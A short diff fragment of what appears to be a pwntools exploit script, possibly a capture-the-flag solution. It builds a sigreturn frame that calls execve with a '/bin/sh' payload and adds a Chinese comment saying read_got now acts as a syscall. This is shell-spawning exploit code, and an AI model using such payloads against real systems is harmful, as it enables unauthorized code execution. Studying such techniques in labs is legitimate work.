@@ -52,7 +52,7 @@ frame.rsi = 0
 frame.rdx = 0
 frame.rax = constants.SYS_execve
 frame.rsp = read_got
-frame.rip = ret
+frame.rip = ret            # 此时read_got是syscall
 
 payload = b"/bin/sh\x001111"
 payload += p64(bss + 0x700)
